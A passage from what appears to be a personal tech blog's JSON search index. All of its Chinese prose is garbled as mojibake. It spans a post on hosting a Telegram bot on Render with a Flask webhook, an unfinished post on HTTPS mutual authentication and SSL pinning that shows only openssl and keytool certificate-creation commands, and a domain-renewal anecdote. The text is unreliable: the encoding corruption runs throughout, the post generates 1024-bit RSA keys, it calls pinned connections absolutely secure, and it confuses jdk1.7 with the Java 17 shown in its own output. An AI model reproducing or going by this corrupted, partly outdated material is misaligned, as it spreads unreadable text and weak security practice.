ç§’åè¿™ä¸ªå‡½æ•°å°†ä¼šè¢«å¼ºåˆ¶åœæ­¢ï¼Œå¤ªè‰°éš¾äº†ï¼Œåªèƒ½é‡æ–°æ‰¾æ‰¾å…¶ä»–æ–¹æ³•å’¯ # render æœ€ç»ˆæˆ‘çš„ bot ä»£ç æ˜¯éƒ¨ç½²åœ¨ render ä¸Šé¢çš„ï¼Œå…è´¹ç‰ˆæ¯ä¸ªæœˆ 750 å°æ—¶å®Œå…¨å¤Ÿç”¨äº† (è¦çŸ¥é“ä¸€ä¸ªæœˆæœ€é•¿ä¹Ÿå°± 744 å°æ—¶å‘¢) é¦–å…ˆæˆ‘ä»¬å» render ä¸Šæ³¨å†Œä¸€ä¸ªè´¦å· ç„¶ååœ¨å³ä¸Šè§’ç‚¹å‡» New , å¹¶åˆ›å»ºä¸€ä¸ª Web Service é€‰æ‹© Build and deploy from a Git repository å¹¶ç‚¹å‡» Next ä½ å¯ä»¥å°† oacia_bot fork åˆ°ä½ çš„ä»“åº“é‡Œé¢ï¼Œæˆ–è€…ç›´æ¥ç”¨ bot ä»“åº“çš„ git é“¾æ¥æ¥åˆ›å»º https://github.com/oacia/oacia_bot ä¹‹åå°±æ˜¯è®¾å®šè¿è¡Œçš„ç¯å¢ƒäº†ï¼Œåç§°ä¸é‡å¤å°±å¯ä»¥äº†ï¼Œregion è¡¨ç¤ºæœåŠ¡å™¨ï¼Œå“ªä¸ªæœåŠ¡å™¨ç¦»ä½ è¿‘å°±é€‰å“ªä¸ª æ¥ä¸‹æ¥è¿™ä¸ª Start Command éœ€è¦å¡«å…¥ python main.py , æœåŠ¡å™¨ç¤ºä¾‹é€‰æ‹©å…è´¹å°±å¤Ÿç”¨äº† å†å¾€ä¸‹çœ‹ï¼Œæˆ‘ä»¬è¦è®¾å®šè¿™å››ä¸ªç¯å¢ƒå˜é‡ï¼Œå‰é¢ä¸‰ä¸ªæˆ‘ä»¬ä¹‹å‰å°±è·å–è¿‡äº†ï¼Œå¡«å…¥å³å¯ï¼Œè¿™ä¸ª RENDER_NAME æ˜¯æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„ Web Service çš„åç§° è¿™ä¸ª RENDER_NAME çš„ä½œç”¨æ˜¯ç»™ bot è®¾ç½® webhook ç”¨çš„ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼Ÿ å› ä¸º render çš„å…è´¹äº‘æœåŠ¡åŒæ ·æœ‰ä¸€ä¸ªé™åˆ¶ï¼Œå°±æ˜¯å¦‚æœ 15 åˆ†é’Ÿå†…æ²¡æœ‰æµé‡è®¿é—®æˆ‘ä»¬åˆ›å»ºçš„ web æœåŠ¡ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°†ä¼šè¢«æš‚åœï¼Œç›´åˆ°æœ‰æµé‡ç»è¿‡ web æœåŠ¡æ—¶ï¼Œè¿™ä¸ªæœåŠ¡æ‰ä¼šè¢«é‡æ–°å¯åŠ¨ï¼Œè€Œæˆ‘æ‰€ä½¿ç”¨çš„æ˜¯ telethon, è¦ç›´åˆ°æœåŠ¡å…³äº†å¯å°±æ˜¯çœŸå…³äº†ï¼Œtelethon åˆ›å»ºçš„ client ä¹Ÿå› æ­¤æ— æ³•å’Œ telegram æœåŠ¡å™¨é€šä¿¡äº† æ‰€ä»¥æˆ‘çš„åšæ³•æ˜¯ç»™ bot è®¾ç½®äº†ä¸€ä¸ª webhook render_name = os.getenv(\"RENDER_NAME\")if render_name: requests.post(f\"https://api.telegram.org/bot&#123;bot_token&#125;/setWebhook?url=https://&#123;render_name&#125;.onrender.com/webhook\") if requests.status_codes == 200: print(\"set webhook successful\")å¹¶ç”¨ flask å¼€æ”¾äº†ä¸€ä¸ª webhook çš„è·¯ç”± # render å¿…é¡»å¾—èµ·ä¸€ä¸ª http æœåŠ¡ï¼Œå¦åˆ™å°±ä¼šæ–­å¼€è¿æ¥....from flask import Flaskapp = Flask(__name__)@app.route('/')def home(): return \"hello world\"@app.route('/webhook')def webhook(): return 'ok'if __name__ == \"__main__\": app.run(host='0.0.0.0', port=10000)å½“æœ‰äººç»™ bot å‘æ¶ˆæ¯æ—¶ï¼Œtelegram æœåŠ¡å™¨åŒæ—¶ä¹Ÿä¼šç»™æˆ‘ä»¬è®¾ç½®çš„ webhook ç½‘å€å‘é€ä¸€ä¸ª post çš„ http è¯·æ±‚ï¼Œè¿™æ ·æˆ‘ä»¬çš„ render æœåŠ¡å³ä½¿å› ä¸º 15 åˆ†é’Ÿæ²¡æœ‰æµé‡ç»è¿‡è€Œè¢«æš‚åœäº†ï¼Œä¹Ÿä¼šå› ä¸º telegram æœåŠ¡å™¨çš„æµé‡ç»è¿‡è€Œè¢«é‡å¯ï¼Œtelethon å°±å¯ä»¥å†æ¬¡æˆåŠŸçš„å’Œ telegram æœåŠ¡å™¨é€šè®¯å•¦ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€ bot å¯ä»¥ä¸€ç›´åœ¨ render ä¸Šé¢è¿è¡Œ ~â™ª(^âˆ‡^*)","categories":[],"tags":[]},{"title":"(doing)httpsåŒå‘è®¤è¯åŠç»•è¿‡æ–¹æ³•","slug":"two-way-SSL","date":"2023-12-14T10:00:32.000Z","updated":"2024-07-12T03:14:16.013Z","comments":true,"path":"two-way-SSL/","link":"","permalink":"https://oacia.dev/two-way-SSL/","excerpt":"","text":"æ—¥å¸¸çš„ APP ä¸ºäº†ä¸è¢«åˆ«äººé€šè¿‡æŠ“åŒ…è½¯ä»¶æŠ“å–ä¸æœåŠ¡å™¨é€šä¿¡çš„æµé‡ï¼Œæ‰€ä»¥ä¼šåœ¨æµé‡çš„å®‰å…¨ä¼ è¾“ä¸Šåšæ–‡ç« ï¼Œæœ€å®‰å…¨çš„åšæ³•å½“ç„¶æ˜¯ä½¿ç”¨ç§æœ‰åè®® (å³åè®®æ ¼å¼ä¸å…¬å¼€çš„åè®®), ä¾‹å¦‚æŠ–éŸ³çš„ quic åè®®ï¼Œå’¸é±¼çš„ spdy åè®®ç­‰ç­‰ï¼Œåˆ©ç”¨è¿™äº›ç§æœ‰åè®®åŒ…è£…æµé‡ï¼Œä»è€Œä½¿æŠ“åŒ…å·¥å…·æ— æ³•è¯†åˆ«å‡ºè¿™ä¸²æµé‡çš„å®é™…å†…å®¹æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥å°±åªèƒ½æ”¾è¡Œè¿™æ®µæµé‡ï¼Œé¢å¯¹ç§æœ‰åè®®å€˜è‹¥åˆ©ç”¨ reqable , fiddler , charles ç­‰å»æŠ“åŒ…æ˜¯æŠ“ä¸åˆ°çš„ï¼Œè€Œå”¯ä¸€èƒ½å¤ŸæŠ“åˆ°è¿™æ®µæµé‡çš„å°±æ˜¯ wireshark , å¹¶ä¸”è¿˜éœ€è¦å¯¹è¿™æ®µæµé‡ç¼–å†™ç‰¹å®šçš„è„šæœ¬è§£ææ‰å¯ä»¥çŸ¥é“è¿™æ®µæµé‡æ‰€æºå¸¦çš„å®é™…æ•°æ® é™¤äº†ç§æœ‰åè®®ä¹‹å¤–ï¼Œæƒ³è®©æµé‡ä¸Šçš„å®‰å…¨è¿˜å¯ä»¥ä½¿ç”¨ SSL pinning çš„æ–¹æ³•æ¥é˜»æ­¢ä¸­é—´äººæŠ“åŒ…çš„å‘ç”Ÿï¼Œå¦‚ä½•è¿›è¡Œ HTTPS åŒå‘è®¤è¯ä»¥åŠä½¿ç”¨ frida å¯¹ SSL pinning è¿›è¡Œç»•è¿‡æ˜¯æœ¬æ–‡æ‰€è¦è®¨è®ºçš„é‡ç‚¹ # SSL pinning è™½ç„¶ HTTPS é‡‡ç”¨äº†å…¬é’¥å’Œè¯ä¹¦çš„åŠ å¯†å’ŒéªŒè¯æ–¹å¼ï¼Œä½†ä¾ç„¶å­˜åœ¨ MIM (ä¸­é—´äººæ”»å‡») çš„å¯èƒ½æ€§ï¼Œå› ä¸ºè¯ä¹¦é¢å‘æœºæ„å¯èƒ½è¢«é»‘å®¢å…¥ä¾µï¼Œè€Œ HTTPS åªéªŒè¯äº†è¯ä¹¦çš„åˆæ³•æ€§ï¼Œå¹¶æ²¡æœ‰éªŒè¯å½“å‰æœåŠ¡å™¨æ˜¯å¦æ˜¯æˆ‘ä»¬è¦è®¿é—®çš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥éœ€è¦å®¢æˆ·ç«¯å»éªŒè¯æœåŠ¡ç«¯è¯ä¹¦çš„åˆæ³•æ€§ï¼Œè¿™å°±æ˜¯ SSL pinning , å®ƒè¿˜æ˜¯ HTTPS å•å‘è®¤è¯çš„èŒƒç•´ä¹‹å†…ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ç›®å‰æŠ“åŒ…å·¥å…· Charles æ‰€é‡‡å–çš„æŠ“åŒ…æ–¹æ³• ä¸ºäº†ä¿è¯æˆ‘ä»¬å½“å‰è®¿é—®çš„æœåŠ¡å™¨å°±æ˜¯æˆ‘ä»¬éœ€è¦è®¿é—®çš„æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»çš„å‘ç”Ÿï¼Œéœ€è¦é€šè¿‡ SSL pinning çš„æ–¹å¼æ¥å®ç°ï¼Œå…¶åŒ…æ‹¬ Certificate Pinning å’Œ Public Key Pinning ä¸¤ç§ã€‚ # è¯ä¹¦é”å®š è¯ä¹¦é”å®šéœ€è¦æŠŠæœåŠ¡å™¨çš„è¯ä¹¦æå‰ä¸‹è½½å¹¶å†…ç½®åˆ°å®¢æˆ·ç«¯ä¸­ï¼Œå½“è¯·æ±‚å‘èµ·æ—¶ï¼Œé€šè¿‡æ¯”å¯¹è¯ä¹¦å†…å®¹æ¥ç¡®å®šè¿æ¥çš„åˆæ³•æ€§ï¼Œä½†ç”±äºè¯ä¹¦å­˜åœ¨è¿‡æœŸæ—¶é—´ï¼Œå› æ­¤å½“æœåŠ¡å™¨ç«¯è¯ä¹¦æ›´æ¢æ—¶ï¼Œéœ€åŒæ—¶æ›´æ¢å®¢æˆ·ç«¯è¯ä¹¦ã€‚ æ—¢ç„¶æ˜¯è¦é”å®šè¯ä¹¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å®¢æˆ·ç«¯ä¸Šåº”è¯¥äº‹å…ˆå­˜åœ¨ä¸€ä¸ªè¯ä¹¦ï¼Œæˆ‘ä»¬æ‰èƒ½é”å®šè¿™ä¸ªè¯ä¹¦æ¥éªŒè¯æˆ‘ä»¬çœŸæ­£çš„æœåŠ¡ç«¯ï¼Œè€Œä¸æ˜¯ä»£ç†å·¥å…·ä¼ªé€ çš„æœåŠ¡ç«¯ã€‚ å¦‚æœæ˜¯é”å®šè¯ä¹¦ï¼Œé‚£é€šå¸¸æƒ…å†µä¸‹ä¼šå°†è¯ä¹¦æ”¾ç½®åœ¨ app/asset ç›®å½•ä¸‹ã€‚ å…·ä½“æ“ä½œï¼šå°† APP ä»£ç å†…ç½®ä»…æ¥å—æŒ‡å®šåŸŸåçš„è¯ä¹¦ï¼Œè€Œä¸æ¥å—æ“ä½œç³»ç»Ÿæˆ–è€…æµè§ˆå™¨å†…ç½®çš„ CA æ ¹è¯ä¹¦å¯¹åº”çš„ä»»ä½•è¯ä¹¦ã€‚ é€šè¿‡è¿™ç§æˆæƒæ–¹å¼ï¼Œä¿éšœäº† APP ä¸æœåŠ¡ç«¯é€šä¿¡çš„å”¯ä¸€æ€§å’Œå®‰å…¨æ€§ï¼Œå› æ­¤ç§»åŠ¨ç«¯ APP ä¸æœåŠ¡ç«¯ï¼ˆä¾‹å¦‚ API ç½‘å…³ï¼‰ä¹‹é—´çš„é€šä¿¡å¯ä»¥ä¿è¯ç»å¯¹çš„å®‰å…¨ã€‚ # å…¬é’¥é”å®š å…¬é’¥é”å®šåˆ™éœ€æå–è¯ä¹¦ä¸­çš„å…¬é’¥å†…ç½®åˆ°å®¢æˆ·ç«¯ä¸­ï¼Œé€šè¿‡æ¯”å¯¹å…¬é’¥å€¼æ¥éªŒè¯è¿æ¥çš„åˆæ³•æ€§ï¼Œç”±äºè¯ä¹¦æ›´æ¢ä¾ç„¶å¯ä»¥ä¿è¯å…¬é’¥ä¸€è‡´ï¼Œæ‰€ä»¥å…¬é’¥é”å®šä¸å­˜åœ¨å®¢æˆ·ç«¯é¢‘ç¹æ›´æ¢è¯ä¹¦çš„é—®é¢˜ï¼Œå¹¶ä¸”ä¹‹åæˆ‘ä»¬æ‰€ä½¿ç”¨çš„ SSL pinning ä¹ŸåŒæ ·æ˜¯å…¬é’¥é”å®šã€‚ # HTTPS åŒå‘è®¤è¯åŸç† åŒå‘éªŒè¯ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨ç«¯è¯ä¹¦çš„æ­£ç¡®æ€§ï¼ŒæœåŠ¡å™¨ç«¯ä¹ŸéªŒè¯å®¢æˆ·ç«¯çš„è¯ä¹¦æ­£ç¡®æ€§ï¼Œå³ æœåŠ¡ç«¯ä½¿ç”¨ ca.crt æ ¡éªŒå®¢æˆ·ç«¯çš„ client.crt å’Œ client.key å®¢æˆ·ç«¯ä½¿ç”¨ ca.crt æ ¡éªŒæœåŠ¡ç«¯çš„ server.crt å’Œ server.key è¯¦ç»†çš„ HTTPS è¿æ¥è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶ä¸­çš„ root.crt å³ ca.crt å®¢æˆ·ç«¯å‘èµ·å»ºç«‹ HTTPS è¿æ¥è¯·æ±‚ï¼Œå°† SSL åè®®ç‰ˆæœ¬çš„ä¿¡æ¯å‘é€ç»™æœåŠ¡ç«¯ï¼› æœåŠ¡å™¨ç«¯å°†æœ¬æœºçš„å…¬é’¥è¯ä¹¦ï¼ˆserver.crtï¼‰å‘é€ç»™å®¢æˆ·ç«¯ï¼› å®¢æˆ·ç«¯è¯»å–å…¬é’¥è¯ä¹¦ï¼ˆserver.crtï¼‰ï¼Œå–å‡ºäº†æœåŠ¡ç«¯å…¬é’¥ï¼› å®¢æˆ·ç«¯å°†å®¢æˆ·ç«¯å…¬é’¥è¯ä¹¦ï¼ˆclient.crtï¼‰å‘é€ç»™æœåŠ¡å™¨ç«¯ï¼› æœåŠ¡å™¨ç«¯ä½¿ç”¨æ ¹è¯ä¹¦ï¼ˆroot.crtï¼‰è§£å¯†å®¢æˆ·ç«¯å…¬é’¥è¯ä¹¦ï¼Œæ‹¿åˆ°å®¢æˆ·ç«¯å…¬é’¥ï¼› å®¢æˆ·ç«¯å‘é€è‡ªå·±æ”¯æŒçš„åŠ å¯†æ–¹æ¡ˆç»™æœåŠ¡å™¨ç«¯ï¼› æœåŠ¡å™¨ç«¯æ ¹æ®è‡ªå·±å’Œå®¢æˆ·ç«¯çš„èƒ½åŠ›ï¼Œé€‰æ‹©ä¸€ä¸ªåŒæ–¹éƒ½èƒ½æ¥å—çš„åŠ å¯†æ–¹æ¡ˆï¼Œä½¿ç”¨å®¢æˆ·ç«¯çš„å…¬é’¥åŠ å¯†åå‘é€ç»™å®¢æˆ·ç«¯ï¼› å®¢æˆ·ç«¯ä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†åŠ å¯†æ–¹æ¡ˆï¼Œç”Ÿæˆä¸€ä¸ªéšæœºæ•° Rï¼Œä½¿ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†åä¼ ç»™æœåŠ¡å™¨ç«¯ï¼› æœåŠ¡ç«¯ç”¨è‡ªå·±çš„ç§é’¥å»è§£å¯†è¿™ä¸ªå¯†æ–‡ï¼Œå¾—åˆ°äº†å¯†é’¥ R æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯åœ¨åç»­é€šè®¯è¿‡ç¨‹ä¸­å°±ä½¿ç”¨è¿™ä¸ªå¯†é’¥ R è¿›è¡Œé€šä¿¡äº†ã€‚ # è‡ªç­¾åè¯ä¹¦ # è¯ä¹¦å‡†å¤‡ åœ¨åˆ¶ä½œè¯ä¹¦å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹æ¯ä¸€ä¸ªè¯ä¹¦çš„æ ¼å¼ JKSï¼šæ•°å­—è¯ä¹¦åº“ã€‚JKS é‡Œæœ‰ KeyEntry å’Œ CertEntryï¼Œåœ¨åº“é‡Œçš„æ¯ä¸ª Entry éƒ½æ˜¯é åˆ«åï¼ˆaliasï¼‰æ¥è¯†åˆ«çš„ã€‚ P12ï¼šæ˜¯ PKCS12 çš„ç¼©å†™ã€‚åŒæ ·æ˜¯ä¸€ä¸ªå­˜å‚¨ç§é’¥çš„è¯ä¹¦åº“ï¼Œç”± .jks æ–‡ä»¶å¯¼å‡ºçš„ï¼Œç”¨æˆ·åœ¨ PC å¹³å°å®‰è£…ï¼Œç”¨äºæ ‡ç¤ºç”¨æˆ·çš„èº«ä»½ã€‚ CERï¼šä¿—ç§°æ•°å­—è¯ä¹¦ï¼Œç›®çš„å°±æ˜¯ç”¨äºå­˜å‚¨å…¬é’¥è¯ä¹¦ï¼Œä»»ä½•äººéƒ½å¯ä»¥è·å–è¿™ä¸ªæ–‡ä»¶ ã€‚ BKSï¼šç”±äº Android å¹³å°ä¸è¯†åˆ« .keystore å’Œ .jks æ ¼å¼çš„è¯ä¹¦åº“æ–‡ä»¶ï¼Œå› æ­¤ Android å¹³å°å¼•å…¥ä¸€ç§æ–°çš„è¯ä¹¦åº“æ ¼å¼ï¼ŒBKSã€‚ æ•´ä¸ªåŒå‘è®¤è¯çš„æµç¨‹éœ€è¦å…­ä¸ªè¯ä¹¦æ–‡ä»¶ï¼š æœåŠ¡å™¨ç«¯å…¬é’¥è¯ä¹¦ï¼šserver.crt æœåŠ¡å™¨ç«¯ç§é’¥æ–‡ä»¶ï¼šserver.key æ ¹è¯ä¹¦ï¼šroot.crt å®¢æˆ·ç«¯å…¬é’¥è¯ä¹¦ï¼šclient.crt å®¢æˆ·ç«¯ç§é’¥æ–‡ä»¶ï¼šclient.key å®¢æˆ·ç«¯é›†æˆè¯ä¹¦ï¼ˆåŒ…æ‹¬å…¬é’¥å’Œç§é’¥ï¼Œç”¨äºå®‰å“è®¿é—®åœºæ™¯ï¼‰ï¼šclient.bks # è¯ä¹¦åˆ¶ä½œ å› ä¸ºè‡ªç­¾åè¯ä¹¦å®Œå…¨å…è´¹ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨è‡ªç­¾åè¯ä¹¦æ¥ä½œä¸ºæˆ‘ä»¬çš„å®¢æˆ·ç«¯ / æœåŠ¡ç«¯è¯ä¹¦ # ç”Ÿæˆè‡ªç­¾åæ ¹è¯ä¹¦ åˆ›å»ºæ ¹è¯ä¹¦ç§é’¥ï¼š openssl genrsa -out root.key 1024 åˆ›å»ºæ ¹è¯ä¹¦è¯·æ±‚æ–‡ä»¶ï¼š openssl req -new -out root.csr -key root.keyè¿™ä¸€æ­¥ä»¥åŠä¸‹é¢ç”ŸæˆæœåŠ¡å™¨è¯·æ±‚æ–‡ä»¶å’Œå®¢æˆ·ç«¯è¯·æ±‚æ–‡ä»¶çš„è¿‡ç¨‹éƒ½éƒ½è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š æ ¹è¯ä¹¦çš„ Common Name å¡«å†™ root å°±å¯ä»¥ï¼Œæ‰€æœ‰å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯çš„è¯ä¹¦è¿™ä¸ªå­—æ®µéœ€è¦å¡«å†™åŸŸåï¼Œä¸€å®šè¦æ³¨æ„çš„æ˜¯ï¼Œæ ¹è¯ä¹¦çš„è¿™ä¸ªå­—æ®µå’Œå®¢æˆ·ç«¯è¯ä¹¦ã€æœåŠ¡å™¨ç«¯è¯ä¹¦ä¸èƒ½ä¸€æ · å…¶ä»–æ‰€æœ‰å­—æ®µçš„å¡«å†™ï¼Œæ ¹è¯ä¹¦ã€æœåŠ¡å™¨ç«¯è¯ä¹¦ã€å®¢æˆ·ç«¯è¯ä¹¦éœ€ä¿æŒä¸€è‡´æœ€åçš„å¯†ç å¯ä»¥ç›´æ¥å›è½¦è·³è¿‡ã€‚ åˆ›å»ºæ ¹è¯ä¹¦ï¼š openssl x509 -req -in root.csr -out root.crt -signkey root.key -CAcreateserial -days 3650ç»è¿‡ä¸Šé¢ä¸‰ä¸ªå‘½ä»¤è¡Œï¼Œæˆ‘ä»¬æœ€ç»ˆå¯ä»¥å¾—åˆ°ä¸€ä¸ªç­¾åæœ‰æ•ˆæœŸä¸º 10 å¹´çš„æ ¹è¯ä¹¦ root.crtï¼Œåé¢æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ ¹è¯ä¹¦å»é¢å‘æœåŠ¡å™¨è¯ä¹¦å’Œå®¢æˆ·ç«¯è¯ä¹¦ã€‚ # ç”Ÿæˆè‡ªç­¾åæœåŠ¡å™¨ç«¯è¯ä¹¦ ç”ŸæˆæœåŠ¡å™¨ç«¯è¯ä¹¦ç§é’¥ï¼š openssl genrsa -out server.key 1024 ç”ŸæˆæœåŠ¡å™¨è¯ä¹¦è¯·æ±‚æ–‡ä»¶ï¼Œè¿‡ç¨‹å’Œæ³¨æ„äº‹é¡¹å‚è€ƒæ ¹è¯ä¹¦ï¼Œæœ¬èŠ‚ä¸è¯¦è¿°ï¼š openssl req -new -out server.csr -key server.key ç”ŸæˆæœåŠ¡å™¨ç«¯å…¬é’¥è¯ä¹¦ openssl x509 -req -in server.csr -out server.crt -CA root.crt -CAkey root.key -CAcreateserial -days 3650ç»è¿‡ä¸Šé¢çš„ä¸‰ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬å¾—åˆ°ï¼š server.keyï¼šæœåŠ¡å™¨ç«¯çš„å¯†é’¥æ–‡ä»¶ server.crtï¼šæœ‰æ•ˆæœŸåå¹´çš„æœåŠ¡å™¨ç«¯å…¬é’¥è¯ä¹¦ï¼Œä½¿ç”¨æ ¹è¯ä¹¦å’ŒæœåŠ¡å™¨ç«¯ç§é’¥æ–‡ä»¶ä¸€èµ·ç”Ÿæˆ # ç”Ÿæˆè‡ªç­¾åå®¢æˆ·ç«¯è¯ä¹¦ ç”Ÿæˆå®¢æˆ·ç«¯è¯ä¹¦å¯†é’¥ï¼š openssl genrsa -out client.key 1024 ç”Ÿæˆå®¢æˆ·ç«¯è¯ä¹¦è¯·æ±‚æ–‡ä»¶ openssl req -new -out client.csr -key client.key ç”Ÿå®¢æˆ·ç«¯è¯ä¹¦ openssl x509 -req -in client.csr -out client.crt -CA root.crt -CAkey root.key -CAcreateserial -days 3650 ç”Ÿå®¢æˆ·ç«¯ bks æ ¼å¼è¯ä¹¦ æˆ‘ä»¬é¦–å…ˆæŸ¥çœ‹è‡ªå·±çš„ java ç‰ˆæœ¬ï¼Œä¾‹å¦‚æˆ‘ç°åœ¨çš„ java ç‰ˆæœ¬æ˜¯ jdk1.7 PS C:\\Users\\oacia> java --versionjava 17.0.8 2023-07-18 LTSç„¶åå‰å¾€ [https://www.bouncycastle.org/latest_releases.html) ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ bcprov , æˆ‘çš„ jdk1.7 åº”è¯¥ä¸‹è½½çš„ jar åŒ…æ˜¯ bcprov-jdk15to18-177.jar éšåè¾“å…¥ä¸‹åˆ—å‘½ä»¤å³å¯å°† crt æ ¼å¼çš„è¯ä¹¦è½¬æ¢ä¸º bks æ ¼å¼çš„è¯ä¹¦ keytool -import -alias client -file .\\client.crt -keystore .\\client.bks -storetype BKS -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath .\\bcprov-jdk15to18-177.jar -storepass 123456åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†å°†æ ¹è¯ä¹¦ root.crt ä¹Ÿè½¬æ¢ä¸º root.bks , å› ä¸ºåœ¨ Android ä¸­æ™ºèƒ½è¯†åˆ« bks æ ¼å¼çš„è¯ä¹¦ ## æ€»ç»“ é€šè¿‡ä¸Šè¿°è¿‡ç¨‹è‡ªå®šä¹‰è¯ä¹¦çš„åˆ¶ä½œï¼Œæˆ‘ä»¬å·²ç»å¾—åˆ°äº†æ‰€éœ€è¦çš„è¯ä¹¦ android å®¢æˆ·ç«¯ client.bks : è¿™æ˜¯å®¢æˆ·ç«¯è¯ä¹¦ï¼Œéœ€è¦å‘é€ç»™æœåŠ¡ç«¯è¿›è¡Œæ ¡éªŒ root.bks : è¿™æ˜¯æ ¹è¯ä¹¦ï¼Œç”¨æ¥æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦çš„åˆæ³•æ€§ python æœåŠ¡ç«¯ server.crt å’Œ server.key : è¿™æ˜¯æœåŠ¡ç«¯è¯ä¹¦ï¼Œéœ€è¦å‘é€ç»™å®¢æˆ·ç«¯è¿›è¡Œæ ¡éªŒ root.crt : è¿™æ˜¯æ ¹è¯ä¹¦ï¼Œç”¨æ¥æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦çš„åˆæ³•æ€§ # Android å®¢æˆ·ç«¯ # å‚è€ƒèµ„æ–™ å…³äºå•å‘è®¤è¯ä¸åŒå‘è®¤è¯ é˜¿é‡Œäº‘ HTTPS åŒå‘è®¤è¯","categories":[],"tags":[]},{"title":"è¿™ä¸¤ä¸ªæœˆå…³äºåŸŸåçš„äºŒä¸‰äº‹","slug":"blog-domain","date":"2023-12-12T16:59:22.000Z","updated":"2024-01-26T12:42:04.906Z","comments":true,"path":"blog-domain/","link":"","permalink":"https://oacia.dev/blog-domain/","excerpt":"","text":"ä»Šå¤©åˆšåœ¨ namesilo è´­ä¹°äº†ä¸€ä¸ªæ–°çš„åŸŸå oacia.dev , è¦æ˜¯æœ‰äººæ¥è¿‡æˆ‘çš„åšå®¢çš„è¯ï¼Œåº”è¯¥è®°å¾—è¿™ä¸ªåšå®¢æ›¾ç»çš„åŸŸåæ˜¯ oacia.cc , å½“ç„¶äº†æˆ‘ä¹Ÿéå¸¸å–œæ¬¢ cc è¿™ä¸ªé¡¶çº§åŸŸåï¼Œè¿™ä¸ªåŸŸåæ˜¯æˆ‘ä¸€å¹´å‰æ³¨å†Œçš„ï¼Œä¸è¿‡ä¸å¹¸çš„æ˜¯åœ¨ä»Šå¹´ä¹æœˆä»½çš„æ—¶å€™ï¼Œæˆ‘çš„åŸŸåè¿‡æœŸäº†ï¼Œå½“æ—¶æˆ‘çœ‹åˆ° 75 å—çš„ç»­è´¹ä»·æ ¼è¿˜çº³é—·ä¸ºä»€ä¹ˆå˜è´µäº†ï¼Œå› ä¸ºå»å¹´çš„æ—¶å€™æˆ‘è®°å¾—éå¸¸æ¸…æ¥šç»­è´¹åªéœ€è¦ä¸‰åå¤šå…ƒçš„ï¼Œéšåå°±çœ‹åˆ°äº†é˜¿é‡Œäº‘çš„å…¬å‘Šè¯´ cc åŸŸåè¦æ¶¨ä»·äº†â€¦ å”‰å¤ªéš¾å—äº†ï¼Œéšåæˆ‘å°±å»è…¾è®¯äº‘å’Œåä¸ºäº‘éƒ½å»æœäº†ä¸€ä¸‹ cc è¿™ä¸ªé¡¶çº§åŸŸåçš„ä»·æ ¼ï¼ŒéšåæƒŠè®¶çš„å‘ç°åä¸ºäº‘åªéœ€è¦ 35 å…ƒ / å¹´ï¼Œå½“æ—¶æˆ‘æƒ³é‚£æˆ‘ç›´æ¥æŠŠåŸŸåè½¬åˆ°åä¸ºäº‘ä¸å°±å¥½äº†ï¼Œè½¬ç§»æ³¨å†Œå•†åº”è¯¥æ˜¯å¾ˆæ–¹ä¾¿çš„äº‹æƒ…å§ï¼Œéšåæˆ‘å°è¯•ä¸€ä¸‹æ‰å‘ç°ï¼Œ åŸŸåè¿‡æœŸä¹‹åå°±ä¸èƒ½å†è½¬ç§»åŸŸåäº†ï¼Œè€Œæˆ‘åˆä¸æ˜¯å¾ˆæƒ³åœ¨è´µäº†æ¥è¿‘ 50ï¼…ä»·æ ¼çš„é˜¿é‡Œäº‘ç»­è´¹åŸŸåï¼Œæ‰€ä»¥æˆ‘æƒ³çš„æ˜¯åŸŸååº”è¯¥å¾ˆå¿«å°±ä¼šè¢«åˆ é™¤äº†å§ï¼Œç»“æœå‘¢ï¼Œåˆå»ç½‘ä¸Šçœ‹äº†ä¸€ä¸‹ï¼Œcc åŸŸåè¦ç­‰ 30 å¤©çš„ç»­è´¹å®½é™æœŸå’Œ 29 å¤©çš„èµå›æœŸä¹‹åæ‰ä¼šè¢«å®Œå…¨åˆ é™¤å¼€æ”¾æ³¨å†Œ. è¿™å°±æ„å‘³ç€æˆ‘éœ€è¦ç­‰åˆ°ä¸¤ä¸ªæœˆä¹‹å (ä¹Ÿå°±æ˜¯ 12 æœˆä»½), è¿™ä¸ªåŸŸåæ‰èƒ½é‡æ–°è´­ä¹°ï¼Œæ‰€ä»¥è¿™æ®µæ—¶é—´åŸŸåè¿‡æœŸäº†ä¹‹åæˆ‘ä¹Ÿå°±æ²¡æœ‰å†ç®¡äº†ï¼Œæƒ³ç€æˆ‘åªè¦ç­‰åˆ° 12 æœˆä»½çš„æ—¶å€™å†é‡æ–°åœ¨åä¸ºäº‘æŠŠ oacia.cc è¿™ä¸ªåŸŸåä¹°å›æ¥ä¸å°±è¡Œäº† äºæ˜¯ç­‰å‘€ç­‰å‘€ç­‰å‘€ç­‰å‘€ï¼Œç»ˆäºç†¬åˆ°äº†åäºŒæœˆä»½ï¼Œè¯´å®è¯è¿™ä¸¤ä¸ªæœˆåšå®¢æ— 